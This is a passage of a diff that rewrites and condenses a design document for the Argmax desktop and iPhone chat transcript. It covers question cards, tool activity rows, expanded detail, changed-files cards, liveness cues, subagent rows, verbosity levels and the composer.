-- **Links resolve before skill tokens,** so the path segments in `https://host/plan` are not read as invocations.
-
-Every `http(s)` link in the surface is one component, [WebLink.tsx](../src/renderer/components/WebLink.tsx), shared with the assistant markdown anchor. It owns the whole routing decision: plain click follows the Settings → General link target, ⌘/Ctrl-click opens the other one, and the system browser needs an explicit `system:open-path` because the Tauri webview swallows `target="_blank"`. Over the remote bridge both desktop routes stand down and the anchor's own target carries the link into the reader's browser.
-
-### A prompt from another session
-
-An agent using the `argmax` tools can send a turn into another session, and
-Argmax itself sends one when a launched session finishes
-([agent-tools.md](agent-tools.md)). Those turns are ordinary `user.message`
-rows carrying an `origin` block on the payload — `{sessionId, label, kind}`,
-where `kind` is `message` or `completion` — and the bubble reads differently
-because of it: a quiet "From `<label>`" header whose label opens the sending
-chat, and `aria-label="Message from another chat"` on the group, so a reader
-never mistakes a machine's prompt for one the user typed. A malformed or
-missing `origin` falls back to the plain bubble rather than failing.
-
-## Card Architecture
-
-In headless structured mode (`-p --output-format stream-json`), `AskUserQuestion` returns a tool result with a status error to signal pause for input. Argmax extracts the structured payload (`input.questions`) and displays it as an interactive card instead of a failed tool call. The error text is Argmax's own: the control channel denies the call with a message saying the card is on screen and the user's answer arrives as the next user message, so the model ends the turn instead of reading the CLI's default result as a dismissal. See [approvals-checks.md](approvals-checks.md).
-
-`SendUserMessage` carries plain user-facing text, so it is normalized directly into `message.completed` rather than a card.
-
-### Card Detection Rules
-
-Defined in [turnInteractiveCards.ts](../src/renderer/lib/turnInteractiveCards.ts) and [sessionTurnView.ts](../src/renderer/lib/sessionTurnView.ts):
-
-| Rule | Target | Behavior |
+| Path | Who | Answer |
 |---|---|---|
-| **First valid wins** | `AskUserQuestion` | Pins card key to the first valid tool call to preserve user selections across retry loops. |
-| **Tool row hidden** | ask-question tools | Hides matching raw tool IDs from the rendered conversation. |
-| **Hide card tools** | ask-question tools | Card-producing calls are removed before adjacent visible activity is grouped. |
-| **Error rendering** | The question card | The card renders even when tool status is `error` (standard behavior in non-interactive CLI modes). |
-| **Post-card text suppression** | The question card | Assistant text with `createdAt > tool.createdAt` in the same turn is filtered out to avoid speculative responses before user submission. |
+| Legacy card | Claude | `sendAfterTerminate` stops the probe first, so the answer does not queue behind trailing output. It lands as a user message. |
+| `delivery: "blocking"` | Codex `request_user_input`, Cursor, OpenCode | `questions:resolve` resumes the waiting request within the turn. Answer values stay out of timeline events. |
+| `delivery: "async"` | Nonblocking Codex | The next-user-message flow, while the agent keeps working. |
 
-### The Question Dock
+Rules across paths:
 
-While the agent is waiting on an answer there is nothing to type, so the
-question takes the composer's slot instead of sitting in the scrollback where a
-turn that keeps working would scroll it away. It wears `.session-input` — the
-composer's own surface, radius and lift — because it *is* the thing you act in
-right now; see [styling.md](styling.md).
+- A draft outranks a legacy question. The composer stays mounted with its draft, and that question stays undocked, so clicking Send cannot land the panel under the click. Focus alone does not undock a question.
+- Clicking an option never submits.
+- `formatAnswer` in [questions.ts](../src/renderer/lib/questions.ts) is the single source of the answer shape. An answer is drawn verbatim, so `**` would show as asterisks.
+- Assistant text after a legacy card is filtered out, because it is speculation before the user answers.
 
-`SessionConversation` reads the live question from the latest turn and the
-turn stops drawing its card. Synchronous Codex questions can be answered and
-followed by another question within that same turn.
+## Activity rows
 
-Codex's async questions use the same dock while the agent continues working.
-Their normalized input carries `delivery: "async"`, which keeps later assistant
-messages visible. Claude's blocking question cards still suppress fallback
-prose emitted after the ask. Submitting either kind uses the existing
-stop-before-answer flow.
+Tool activity renders as text, not chrome: `<icon> <verb> <target> <+adds −dels> <chevron>`.
 
-Blocking questions (Codex's `request_user_input`, Cursor's
-`cursor/ask_question`, OpenCode's `question`) carry `delivery: "blocking"` and
-`requestId`.
-Their answers go to `questions:resolve`, which resumes the waiting request
-within the same turn. Nonblocking `request_user_input` requests carry
-`delivery: "async"`, so the dock uses the next-user-message flow while Codex
-keeps working. A settled blocking request no longer suppresses later assistant
-messages. Blocking questions remain answerable when the composer has a draft,
-and the draft returns after the question is settled.
+The rules that matter across files:
 
-A failed answer or dismissal keeps the question and selected answer in place.
-The dock shows a short inline retry message only after that action fails.
-Backend error details stay out of the chat.
+- **The icon legend is one legend on two platforms.** [tool-activity.css](../src/renderer/styles/tool-activity.css) and [TranscriptToolIcon.swift](../ios/Argmax/Sources/Transcript/TranscriptToolIcon.swift) move together. Red is a status override for failed and cancelled work, so a delete keeps the file-change colour.
+- **Transport is never a row.** `foldCodexAgentControlTools` drops Codex's `wait`, `close_agent`, and `send_message_to_thread`, because they carry only internal thread ids. Grok's output poll is hidden by `isHiddenToolName`.
+- **Provider tool ids repeat across turns.** `buildSessionToolCalls` scopes them with `providerInvocationId`, so a tool stays in the turn that ran it.
+- **A row that expands to nothing is not a control.** `toolCallHasExpandableDetail` is the same gate the detail uses.
+- **Bash never restates itself.** The row is the command, so the block holds only stdout.
+- **A tool line is one ink.** It is a token, never an opacity fade. Fading `--muted` drops a file name below readable contrast on paper.
+- **Group totals are activity, not a diff.** `summarizeToolChangeCounts` counts completed edits, so repeated edits accumulate and need not match the final Git diff.
+- **A group's icon differs by platform.** The first activity supplies the desktop group icon. iPhone groups show up to three.
 
-An **answered** question leaves the dock. Legacy card answers appear as user
-messages. Synchronous Codex answers settle the tool within the same turn and
-do not add a user message.
+### Expanded detail
 
-- **Several questions page, they do not stack.** `‹ 1 of 3 ›` in the header, so
-  the slot is the same height whether the agent asked one thing or four. A
-  single-select pick settles its question and moves to the next by itself; the
-  `→` is drawn only on rows whose pick advances.
-- **Closing a legacy card restores the composer.** The `✕` ("Answer in your own words") puts the
-  composer back so the reader can reply in prose instead. The question leaves
-  the screen with the panel; it is not redrawn in the scrollback. The agent's
-  own prose above it is the record of the ask, and reopening the chat docks it
-  again.
-  For a synchronous Codex question, closing explicitly dismisses the request
-  and lets the waiting turn continue.
-- **Free-form answers use an "Other" row.** Numbered after the listed
-  options, it is picked like any of them; picked, its label becomes a line to
-  type on, in the row's own type and on the row's own fill, so a typed answer is
-  the same kind of thing as a listed one. It settles by what gets typed, not by
-  the pick — a single-select advances on Enter with text, never on the pick —
-  and Send stays disabled while it is picked and empty. The answer line carries
-  the text as plain words (`Direction: Ship the review first`), joined to the
-  listed picks on a multi-select, so the agent reads it without knowing which it
-  was. Escape on the line returns the caret to the list; it does not close the
-  dock over a half-typed answer.
-  Synchronous Codex questions respect the provider's `isOther` flag and mask
-  secret answer fields.
-- **Send is explicit.** It enables once every question is answered. Clicking an
-  option never submits on its own. The reader can review the selections before
-  the agent receives them.
+[ToolCallDetail.tsx](../src/renderer/components/ToolCallDetail.tsx) draws one soft fill with one scroll. Arguments come first, because that is the order the call happened in. The payload carries no `max-height` of its own, so the transcript never nests a scroller in a scroller. Short scalars ride the footer (`argumentsFitFooter`).
 
-### Keyboard Navigation
+`formatToolOutput` lifts a string out of a display envelope only when every other key is known metadata, so pagination and status are never discarded.
 
-The dock is covered end to end in [SessionConversation.cards.test.tsx](../src/renderer/components/SessionConversation.cards.test.tsx).
+`--tool-block-surface` moves in opposite directions per theme. Mixing it from `--code-surface` put the dark version below the page, so a payload read as a hole.
 
-| Key | Action |
-|---|---|
-| `↑` / `↓` | Move between options |
-| `←` / `→` | Previous / next question |
-| `1`-`9` | Pick option by number |
-| `Space` | Pick the focused option |
-| `Enter` | Submit once answered, otherwise pick the focused option |
-| `Escape` | Close the dock and bring the composer back |
+### Changed files
 
-A legacy question that arrives while the composer holds a draft does not dock.
-The composer remains mounted, preserving the text, attachments and caret, and
-the reader answers from the agent's prose. That question stays undocked after
-the draft is cleared, so clicking Send cannot have the panel land under the
-click. An empty composer has nothing to protect, so its question docks — focus
-alone does not keep a question undocked. (It once did, and since sending
-refocuses the input and it keeps focus for the rest of the turn, nearly every
-question missed the dock until the chat was reopened.)
+[TurnChangesCard.tsx](../src/renderer/components/TurnChangesCard.tsx) ends a finished turn that wrote files.
 
-### Submission Flow
+- `collectTurnFileChanges` reads the same tool input the activity rows read, so the card cannot disagree with them.
+- A row opens that file's diff through the review hook's `openFile`. `Review` uses `openChangesPanel`, which never closes an open panel.
+- Only settled turns get a card, because a live count moves.
 
-When submitting a legacy question card, `sendAfterTerminate` in [sessionConversationHelpers.ts](../src/renderer/components/sessionConversationHelpers.ts) terminates the running probe before sending the answer to prevent queuing behind trailing provider output.
+Liveness needs care here. A `dashboard:delta` carries no session rows, so a state row can lag the transcript by seconds on the phone. `openRunMarkerAt` treats a turn as live while an unclosed `session.streaming` beacon is newer than the row's `lastActivityAt`. The row stays authoritative when it is newer, so a run that died without a closing marker cannot tick forever.
 
-Synchronous Codex questions use `questions:resolve` instead. Each question's
-stable ID maps to its selected labels or free-form answer strings. The
-provider response resumes the original turn, and a correlated completion
-event settles the card. Answer values are omitted from these timeline events.
+Where the line stats come from depends on the provider. See [providers.md](providers.md#measured-file-change-diffs).
 
-Legacy question responses format as `<header>: <chosen label>` per question, one per line. The answer lands in the transcript as a user message, drawn verbatim, so `**` would show as asterisks. `formatAnswer` in [questions.ts](../src/renderer/lib/questions.ts) is the single source of that shape.
+### Forks and reverts
 
-## Activity Rows
+A finished turn's footer holds Copy, both Fork actions, and Revert. See [workspaces.md](workspaces.md#forking-at-a-finished-turn).
 
-Tool activity renders as text, not chrome. One grammar covers every row and every group headline:
+### PR milestones
 
-**`<activity icon> <verb> <target> <+adds −dels> <chevron>`**, clustered against the same left edge as the assistant prose.
+The optional sweep (Appearance, off by default) plays only for a confirmed creation or merge newer than the current chat's watch start. It never takes assistant prose or a turn's success as evidence.
 
-| Part | Component | Styling |
+### Errors
+
+[LogBlock.tsx](../src/renderer/components/LogBlock.tsx) draws stderr and `error` events. The kind is a claim about the row: a backend line that merely reports is a `session.note`, and `error` means something failed.
+
+[logDump.ts](../src/renderer/lib/logDump.ts) lifts tracing-style records out of assistant Markdown, and the normalizer classifies raw PTY lines the same way. It drops known housekeeping noise, such as MCP teardown and retry progress. Authentication failures, exhausted retries, storage errors, and provider limits stay visible.
+
+## Thinking and liveness
+
+Exactly one line is live at a time. The rules, timings, and their measurements are in [docs/design/live-activity-timing](design/live-activity-timing/README.md).
+
+- **Providers disagree on how long a call takes.** Three of the five report a call atomically, so a "running" call does not exist for them. The line that just did the work keeps the beat ([activityBeat.ts](../src/renderer/lib/activityBeat.ts)). The iPhone decides it in [TranscriptThinkingLabel.swift](../ios/Argmax/Sources/Transcript/TranscriptThinkingLabel.swift).
+- **Thinking yields to content.** The pre-answer indicator hides as soon as any visible assistant event arrives.
+- **Only a row the reader can watch counts as progress.** A subagent's own calls and a backgrounded launch row do not suppress the cue. A backgrounded launch never gets a completion, so counting it silenced the cue for the rest of the session.
+- **The pre-answer window is a floor.** Before the provider speaks, no other live cue exists, so no suppression rule applies. A stranded `session.compacting` marker must not silence a relaunch.
+- **Reasoning and the cue share one beat.** `liveThoughtOwnsProgress` in [sessionTurnView.ts](../src/renderer/lib/sessionTurnView.ts) decides which element carries progress. `lastThinkingGroupId` decides which block, so a silent reasoner does not open hundreds of expanded blocks.
+- **A finished message owns its beat briefly.** Codex and OpenCode deliver one atomic `message.completed`, so nothing later would hide a label already showing.
+- **Waits count from the beat's own start,** not from the pane's mount. Switching back to a running chat shows the cue at once.
+- **Send starts the turn.** The baseline records the state at send time, because a relaunching follow-up is sent from a terminal state.
+
+`recordChatCue` writes a breadcrumb for each transition under scope `renderer::chat` ([debugging.md](debugging.md)).
+
+Running work is marked on the words with the reading wave ([reading-wave.css](../src/renderer/styles/reading-wave.css)). Its phase comes from the wall clock, so a remount does not restart the pass. The tuning is in [docs/design/live-text-motion](design/live-text-motion/README.md).
+
+## Seams
+
+Compaction is a transcript boundary, not a completed turn. The preceding turn keeps its active display until output resumes or the session ends. A pending approval or blocking question similarly keeps a turn unfinished.
+
+| Marker | Rendered by | Meaning |
 |---|---|---|
-| Verb (`Edited`, `Read`) | `splitLeadingVerb` in [toolCalls.ts](../src/renderer/lib/toolCalls.ts) | `--tool-row-ink`, UI font |
-| Target (file name, command, headline remainder) | `.tool-call-row-target`, `.tool-call-group-eyebrow-detail` | `--tool-row-ink`, same font as the summary verb, including shell commands. Expanded code, terminal output, and diffs retain monospace. |
-| Line stat | [ActivityStat.tsx](../src/renderer/components/ActivityStat.tsx) | `--diff-add-gutter-fg` / `--diff-del-gutter-fg`, tabular |
-| Chevron | `.tool-call-row-chevron` | Only on rows that expand to something. Hidden until hover on rows; shown at rest on group headlines, which are sometimes a turn's only control — except at Minimal (`data-chevron="hover"`), where the headline reports work the reader chose to hide and the glyph waits for a hover, a focus, or an open group. `--tool-row-ink` |
+| `session.compacting` / `session.compacted` | [CompactionNotice.tsx](../src/renderer/components/CompactionNotice.tsx) | Folded by `foldConversation`. Claude repeats the opening row as a heartbeat, so the fold takes consecutive running markers. |
+| `session.provider-changed` | [ProviderSwitchNotice.tsx](../src/renderer/components/ProviderSwitchNotice.tsx) | The next follow-up starts fresh with the capped transcript. |
+| `session.moved` | [ProjectMoveNotice.tsx](../src/renderer/components/ProjectMoveNotice.tsx) | The destination starts a fresh conversation. |
+| `session.note` | [SessionNote.tsx](../src/renderer/components/SessionNote.tsx) | What Argmax did to the chat. It is not a seam, so it never splits a turn. |
 
-Rules this surface holds to:
+`isCompacting` only trusts an opening row that is still the newest event. A Stop mid-compaction leaves a marker with no closing row, and trusting it would suppress the cue for the rest of the chat.
 
-- **Activity icons have colour on desktop and iPhone.** Icons stay static, with no wobble, rotation, or pulsing. Each colour is one family a reader can say in a phrase: coral changed a file, green looked at the project (reads, listings, Git), purple went looking for something (searches, tool discovery, the web, the browser), gold ran a command, which is also where work we could not identify lands, and blue is the agent's own machinery (skills, plans, memory, delegation). Gold takes the transcript's most common row on purpose: commands are a third of all activity, and the colour recedes as the classifier names more of them. Blue is the one colour doing two jobs — it is also where a row lands when nothing named it — so a blue row is either the machinery or a gap, and both are spelled out rather than left to fall through. A delete keeps the file-change colour; red is reserved for failed, cancelled, and agent-stop activity as a status override. The desktop mapping in [tool-activity.css](../src/renderer/styles/tool-activity.css) and the iPhone's in [TranscriptToolIcon.swift](../ios/Argmax/Sources/Transcript/TranscriptToolIcon.swift) are one legend and move together. Monochrome mode uses dedicated bare glyphs for integration badges so their backgrounds cannot swallow the symbol. The desktop and generated iPhone assets share this artwork in `serverIcons.ts`. MCP rows retain their integration artwork, and shell rows can use personal command icon rules described below. The first activity supplies the desktop group icon. iPhone groups show up to three distinct activity or integration icons, or one in Minimal. Labels distinguish running, succeeded, failed, and cancelled operations without automatically expanding a row. Unconfirmed completions use the neutral activity label instead of exposing transport bookkeeping.
-- Codex computer-use calls from `cua_repl` display **Computer use** with a monitor icon. Their arguments and output remain available in the expanded row.
-- Reads targeting only `SKILL.md` entrypoints display as skill activation, including historical rows. Supporting documents and mixed reads retain their file-read label.
-- **Invocation-scoped identity.** Provider tool IDs can repeat across turns. `buildSessionToolCalls` scopes them with `providerInvocationId` and uses chronological unmatched pairs for historical rows that predate that field, so a tool stays in the turn that ran it.
-- **A tool line is one ink.** Verb, target, headline remainder, monochrome mark, and chevron all take `--tool-row-ink` (`--chip-ink`: 4.58:1 on paper, `--muted` in dark), and hover brightens them together to `--muted-strong`. A darker verb read as a second weight on a line meant to stand back from the prose. The ink is a token, never an opacity fade: fading `--muted` drops the file name to 2.4:1 in the light theme. Sub-agent rows keep their accent verb.
-- **Transport is never a row.** Codex's `wait`, `close_agent`, and `send_message_to_thread` name no work and carry only internal thread ids, so `foldCodexAgentControlTools` drops them unconditionally. Matching one to a spawn decides only whether its outcome settles that launch. When a name collides with a real tool, the Codex thread ids in the input are what identify the transport. Grok's `get_command_or_subagent_output` is the same poll for a spawned child and is hidden by `isHiddenToolName`. Leaving it visible split the parent sentence around "Get command or subagent output".
-- **A "Messaged an agent" row is not a dump.** Codex collab `send_message` stores a Fernet token (`gAAAAA…`) plus thread ids — those are not shown, so the row is the activity itself. Claude `SendMessage` keeps the readable body and drops the recipient id and `{resumedAgentId, pin}` receipt. Cursor, OpenCode, and Grok have no equivalent collab token; the Fernet detector is provider-blind so a future one still hides. A row whose leftover arguments are only ciphertext is not a control.
-- **Single calls respect the verbosity.** Minimal and Compact keep even a single call behind a short summary such as "Ran a command", so a long command cannot dominate the conversation. Steps and Detailed show a single call as its target row. Minimal reaches that summary through the same `minimal` flag that suppresses its caption and standing chevron; before that flag reached the single-call branch, a lone `git status --short` was named in full at Minimal and bucketed at Compact — level 1 reading as more than level 2.
-- **An external tool is named by the service it called.** `extractToolName` first resolves provider wrappers: Cursor ACP's `mcpToolCall`, Codex's `mcp_tool_call`, and Cursor's `other` + `_toolName` never reach the UI as labels. `parseMcpToolName` then reads the provider wire shapes (`mcp__<server>__<tool>`, OpenCode's `<server>_<tool>` such as `engram_memory_stats` alongside the repeated `notion_notion-fetch`, and Codex Apps' `linear.list_issues`) and labels them `Notion fetch` or `Linear list issues`. Cursor plugin identifiers collapse to the connected product (`plugin-google-drive-google-drive` → `Google drive`). Wrapper metadata is stripped from expandable Input, leaving only the arguments the agent supplied.
-- **Discovery is visible, bookkeeping stays hidden.** Tool discovery appears as searching for tools, then “Loaded tools” when the result identifies available tools or “Searched tools” otherwise. Activating a skill and invoking a discovered tool are separate activities. Internal task-list writes (`TodoWrite`, `TaskCreate`, `TaskUpdate`) remain hidden because they change no project file. Unknown tools retain a generic activity and their original details.
-- **The stat travels with the target**, not right-aligned into a second column: a transcript is read a row at a time, not compared down a column.
-- **Group edit totals stay at the far right of the headline, and working owns that slot first.** While the group's status is `running` the slot stays empty and the headline itself carries the reading wave (below); the total takes over when the last call settles. A still-growing count read as the finality of a result. `summarizeToolChangeCounts` sums reported additions and deletions across completed edits in the group, deduplicated by tool invocation id. Reads and commands do not reset the totals. Repeated edits to one file accumulate, so these are activity totals, not the final net Git diff. Failed, running, and inferred completions do not contribute. Whole-file deletes without line counts and edits without diff payloads do not invent numbers. Individual rows use the same completion gate, and the group header omits the file count to stay compact.
-- **A connected activity thread.** Consecutive tool summaries, plans, reasoning, and vertical agent rows share a fine neutral connector. Prose and turn boundaries break it. Each visible row keeps its own keyed parent, so inserting or moving a plan cannot reset another row's disclosure. The connector follows the rows that remain after verbosity filtering, with no space reserved for absent plans or agents. The separate Thinking cue joins only when the immediately preceding live turn ends in activity. Expanded details sit inside their row, inset from the connector. Rows have no card or hover fill, and expanded detail keeps its soft fill. Mockups: `docs/design/chat-timeline-concepts`.
-- **A JSON result shows its payload, not its envelope.** `formatToolOutput` lifts the string out of a display envelope when exactly one of `text` / `content` / `result` / `output` holds it and every other key is known envelope metadata (`metadata`, `title`, `type`, `url`). That makes escaped newlines real and promotes `title` onto the block's footer line without discarding pagination, status, or other data fields. Data-shaped JSON is pretty-printed intact, non-JSON is untouched, and bash output keeps byte fidelity. Re-serializing an envelope is not an option: `JSON.stringify` escapes the newlines again.
-- **A row that expands to nothing is not a control.** `toolCallHasExpandableDetail` is the same gate the detail uses. The chevron and button appear only when expanding would reveal output, leftover arguments, an error, a file, a heredoc, or nested activity. A bash command that printed nothing is the row itself. Whitespace-only stdout counts as nothing.
-- **Bash never restates itself.** The row *is* the command: expanding a bash row unwraps its target to the full text instead of clipping it, so the block holds only stdout. A heredoc is the one exception — a row cannot carry newlines — and it opens one payload with real ones. Claude's `description` / `timeout` and Codex's `timeout_ms` are never a reason to show the input, and the arguments that do show are the leftover keys only, never the command again as an escaped string.
+Claude never echoes a locally run slash command, so [claude_control.rs](../src-tauri/src/providers/claude_control.rs) takes `<local-command-stdout>` as the echo. Without it, the `result` was dropped and the turn never ended.
 
-### Expanded Detail
+## Subagents and multitasks
 
-Expanding a row opens **one soft fill**, [ToolCallDetail.tsx](../src/renderer/components/ToolCallDetail.tsx)'s `.tool-call-block`: no border, no rail, one radius, and the fill itself is what says the content is not prose. Before this the detail grew a bordered box per part, each with its own `max-height` and scrollbar, under a floating label — a single call owned four stacked blocks.
+Subagent tool calls draw a launch row through [AgentLaunchList.tsx](../src/renderer/components/AgentLaunchList.tsx). The pane opens in the review panel's Agents view ([AgentsView.tsx](../src/renderer/components/AgentsView.tsx), [AgentActivity.tsx](../src/renderer/components/AgentActivity.tsx)). A multitask draws in [MultitaskRow.tsx](../src/renderer/components/MultitaskRow.tsx) above the composer ([multitask.md](multitask.md)).
 
-| Part | Order | Rule |
-|---|---|---|
-| Arguments | first | Key/value list ([toolArguments.ts](../src/renderer/lib/toolArguments.ts)), above the payload |
-| Payload | middle | Command (heredoc only), `Error`, `Preview`, output |
-| Footer | last | Short arguments, envelope title, lines, size, duration, `Show all` |
+- **The emblem is identity, and it is never a status.** `emblemForCodename` binds a mark to the codename, so Gauss is the same mark everywhere. [export-ios-agent-emblems.mjs](../scripts/export-ios-agent-emblems.mjs) ports the shapes, and `AgentEmblemTests` pins them against the renderer.
+- **A backgrounded launch keeps the nest, not the wave.** It is the one row marked running by inference, so a wave would claim progress the app cannot see.
+- **Agent launches stand apart at every level.** A summary reading "started an agent" hid the row that opens the child's pane.
+- **Tabs keep launch order, and selecting never moves a tab.** A tab's place belongs to the agent.
+- **A subagent run reads at the chat's own verbosity.** A separate setting would be two settings for one reader.
+- **Parent exit ends unfinished native runs.** Resuming the chat does not revive them.
+- **Native identity is parent-scoped.** A dock reference resolves only when its parent conversation id and child id match. Clearing, switching provider, or forking invalidates it, and the old rows stay readable.
+- **Receipts are launch metadata.** Grok's `spawn_subagent` and Claude's `SendMessage` results are hidden, so the pane does not paint their JSON.
+- **Missing Codex launches recover from lineage.** A synthetic row is replaced by the real one through tombstones.
+- **Trace rows are not chat.** `session:agent-events` imports trace files with deterministic ids and hides them from the main view.
 
-Rules this shape holds to:
+## Chat verbosity
 
-- **Arguments come before the result, because that is the order the call happened in.** The old `+ Input` disclosure printed `JSON.stringify(input, null, 2)` *below* the output, so you read the answer and then clicked to find the question. Six lines of braces for three values.
-- **Short scalars ride the footer.** When every leftover argument is a scalar of 32 characters or less, they read as one dim run (`glob *.ts · limit 20`) and the block holds only the payload. Anything longer — a prompt, a body, a filter object — becomes the list at the top. `argumentsFitFooter` owns that split, not the component.
-- **No argument the row already stated.** `REDUNDANT_INPUT_KEYS` drops the path keys, and a `Read` whose only input is its file path shows no argument list at all.
-- **Position labels the payload; `Error` and `Preview` are the exceptions.** "Output" was a lone dim word over a box, labelling the only thing it could be labelling. A failure keeps its label because rose text alone does not say what the block is when the payload is a plain sentence, and a preview keeps its because it is *input* content that would otherwise read as output.
-- **One scroll, and it is the block's body.** `.tool-call-block-body` caps at 16 lines; the payload carries no `max-height` of its own, so the transcript never nests a scroller in a scroller. Truncated output offers `Show all` on the footer instead of a `— showing first 3,000 of 41,208 chars` note.
-- **Separators are full-bleed hairlines inside the fill,** so a block with arguments, a payload and a footer still reads as one object rather than three.
-- **A row that goes mono turns ligatures off.** Geist Mono fuses a run of `=` into one solid bar, so `echo "=== X ==="` read as struck through in the row while the block under it rendered it cleanly — the row was the one mono surface missing `--code-font-features`.
-- **The fill is a token, `--tool-block-surface`, and it moves in opposite directions per theme.** Paper sinks into a well, charcoal lifts out of one: mixing the block from `--code-surface` put the dark version *below* the transcript ground, since dark aliases `--code-surface` to `--panel-sunken`, so a payload read as a hole punched in the page. The diff card body shares the token.
-- **The block hugs its content** (`width: fit-content`). A one-word `ok` stretched across the column read as an empty panel with a word in the corner.
-- **No payload, no fill.** A read that printed nothing renders its `Open` as a bare footer action on the transcript ground — the old version drew an icon column, a path already in the row, and a bordered button. A fill around a single word is a frame around nothing.
-- **The payload reads a notch under the assistant prose** (`--text` 72% toward `--muted-strong`): it is something the transcript reports, not something it says. Mono also sits one type step under the row, since Geist Mono's wider advance makes a block set at the row size read larger than it.
-- **A fact that says nothing is not a fact.** `1 line` never shows — the payload is right there — and size only appears past a kilobyte.
+Settings → Agents has four levels: Minimal, Compact (the default), Steps, Detailed. The phone uses the same names on its own device-local key. Which level shows what is one table in [fixtures/parity/chat-detail.json](../fixtures/parity/chat-detail.json).
 
-### Expanded Diffs
+Each level adds one thing to the one below. Minimal drops finished work, Compact keeps one summary per stretch of work, Steps names every call, Detailed opens them.
 
-An edit row expands into [FileChangeCard.tsx](../src/renderer/components/FileChangeCard.tsx), flush with the row's left edge. Inside a chat card the shared [DiffBlocks.tsx](../src/renderer/components/DiffBlocks.tsx) loses its table chrome: no `@@` hunk header, no gutter band or divider, and the add/delete wash runs unbroken from the line number into the code. A reserved gutter column carries `+` / `−` so numbers stay in one column whether or not the line changed. The diff carries no padding inside the card body: a padded one let the body's own fill show above and below the wash, so a created file read as a green slab with dark corners instead of one object.
+The phone's Minimal differs on purpose. It has no per-turn `Worked for` chip, because its row list is flat with no turn segmentation. A turn therefore never folds its work away there.
 
-When a row expands to a **single** file, the card header collapses to just its `Open` button, floated in the corner and revealed on hover — the row above already names the file and its stat. A row that expands into **several** cards keeps the full per-file header, since there the card is the only place each path appears. A pure-create card reads as an all-addition diff — same green wash and `+` markers as the added lines of an edit — so a new file and an edited one look like the same kind of object in the transcript.
+Two predicates decide what Minimal hides as narration: `isProgressNarration` and `isClosingRemark`. Shape cannot settle every case, because "No, that file does not exist." and "Reading the repo now." are the same shape. The positional guard exists for agents that answer and then record the answer with one closing edit.
 
-### Changed Files Card
+`hasHiddenWork` draws the chip whenever the level hid something, not only when a turn has tools. Otherwise a reasoning-only turn rendered as an empty block with no handle.
 
-A finished turn that wrote files ends with [TurnChangesCard.tsx](../src/renderer/components/TurnChangesCard.tsx), rendered by `TurnBlock` under the turn body and above the hover footer.
+A group stays countless while it holds the beat, because a still-growing tally reads as a final result.
 
-A finished turn's hover footer holds Copy reply, **Fork from this turn** (same checkout), **Fork from this turn into an isolated checkout**, and Revert. Both fork actions send the user message that began the turn as `boundaryEventId`; the footer hides itself on the live turn. A chat made by a fork shows a one-line fork bar in the composer lane ([ForkBar.tsx](../src/renderer/components/ForkBar.tsx)): **Forked from** the source chat's title, which opens the source, and **Bring findings back**, which opens [ForkMergeDialog.tsx](../src/renderer/components/ForkMergeDialog.tsx). Settings → Appearance → **Fork bar in forked chats** hides it. See [workspaces.md](workspaces.md#forking-at-a-finished-turn).
+## Composer
 
-The expanded file list scrolls after reaching 320px or 40% of the viewport height, whichever is smaller. The summary and Review action stay above the scrolling list.
+[SessionComposer.tsx](../src/renderer/components/SessionComposer.tsx) and the launcher share one CodeMirror editor, [ComposerEditorView.tsx](../src/renderer/components/ComposerEditorView.tsx). It loads as its own chunk because the entry's size budget cannot carry CodeMirror. A textarea with the same props stands in until then, and the phone's new-chat screen keeps it.
 
-- **One row per path, not per write.** `collectTurnFileChanges` in [turnFileChanges.ts](../src/renderer/lib/turnFileChanges.ts) folds a turn's writes by path and reads the same tool input the activity rows read, so the card can never disagree with them. A file created and later edited stays a create; a delete decides the turn's verdict on the file.
-- **Where the `+N −N` comes from.** Claude, OpenCode, and Grok send replacement pairs or a new file body. Replacement pairs are snippets, so their diff hides line numbers instead of claiming line 1. Cursor sends the file's whole text before and after each write. The ACP translation reduces that pair to a `unified_diff` with real line numbers ([providers.md](providers.md#cursor-warm-acp-runtime)). Codex update rows can carry a unified diff, and add rows can carry the new file body in `diff`. A Codex row with only a path and kind uses the diff Argmax measured from git at the turn's own boundaries ([measured_diffs.rs](../src-tauri/src/providers/measured_diffs.rs), and [providers.md](providers.md#measured-file-change-diffs)). A final newline terminates the preceding line and does not add an empty line to the stat. Whole-file deletes, oversized diffs, and workspaces without git can carry no stat.
-- **The name is the row.** File names take the UI font, like every other activity-row target — mono is reserved for bash, and a path set in mono turns `run_family_serving.py` into a wall of even-width glyphs. The directory is dropped entirely and lives in the row's `title` and accessible name, where it settles the rare two-files-one-basename case. Each family gets a differently *shaped* glyph (a hash, braces, a flask), not one file outline recolored seven ways, and the add/delete stats sit in their own subgrid columns so digits line up down the card.
-- **A row opens that file's diff**, through the review hook's own `openFile`, which selects the path and switches the panel to Changes in one call. The question a changed-files row raises is "what changed", so the file-tree preview (`openInFilesView`) is the wrong destination and is kept only as `onOpenFile`, the fallback for a host with no Changes view. Paths are handed over workspace-relative; the agent's own are absolute. The header's **Review** opens the panel on Changes via `openChangesPanel`, which — unlike `toggleChangesPanel` — never closes an already-open panel: "Review" is a request to see the changes.
-- **The header toggles the list.** Which state a turn starts in is a setting, `argmax.turnChanges.expanded`, exposed as "Changed files expanded" in Agents settings and threaded down as `defaultTurnChangesExpanded`. It defaults off: the header's count and `+N −N` already say how big the turn was, and a list under every turn crowds the transcript. The mobile peek passes no setting and keeps the list open.
-- **Only settled turns get one.** A live turn's count is a moving number, so `TurnBlock` renders the card only once `running` is false — the same gate the hover footer uses. Whether the newest turn is still live is read from the transcript as well as the session row: `openRunMarkerAt` in [sessionConversationModel.ts](../src/renderer/lib/sessionConversationModel.ts) reports the `session.streaming` beacon of a run nothing has closed, and `SessionConversationTurn` treats the turn as live while that beacon is newer than the row's `lastActivityAt`. A `dashboard:delta` carries no session rows, so state costs a client a `dashboard:list` round trip while transcript events arrive on their own revision feed — on the phone that gap is seconds, and a row left over from before the turn began used to settle a working turn and post every file it had written so far. The row stays authoritative whenever it is the newer of the two, so a run that died without a closing marker cannot tick forever.
-- **The one card with chrome in the activity surface**, and the one place a glyph column is worth it: family ink is what makes a stylesheet and a component tell apart at a glance. `fileFamily` in [fileFamily.ts](../src/renderer/lib/fileFamily.ts) maps a path to one of seven families, each reusing an existing syntax token — no new palette. A test file reads as a test whatever its extension.
-- **The card pins its own line-height.** It sits inside the conversation's prose leading (1.55–1.74); inherited, that stretches every row ~4px past what the card is drawn for.
+Editor decisions:
 
-### PR milestone celebration
+- External edits are part of undo history, because leaving them out made undo replay typing onto text it no longer matched.
+- A different `documentKey` starts a new history, so ⌘Z cannot reach another chat's prompt.
